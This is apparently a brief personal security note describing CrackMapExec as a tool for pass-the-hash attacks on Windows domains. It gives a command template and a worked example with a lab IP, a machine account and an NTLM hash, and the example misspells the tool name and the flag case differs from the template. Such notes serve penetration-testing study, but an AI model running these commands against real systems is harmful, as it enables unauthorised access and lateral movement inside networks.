---
tags:
  - security
---
A tool to perform [[Pass The Hash Attack]] on windows environments.
# format
```
crackmapexec smb <dcIP> -u '<user>' -h <hash>
```
### Example
```
cracmapexec smb 10.0.2.6 -u "mountdoom$" -H b6fe505469151d63ed444de8d1c5c187
```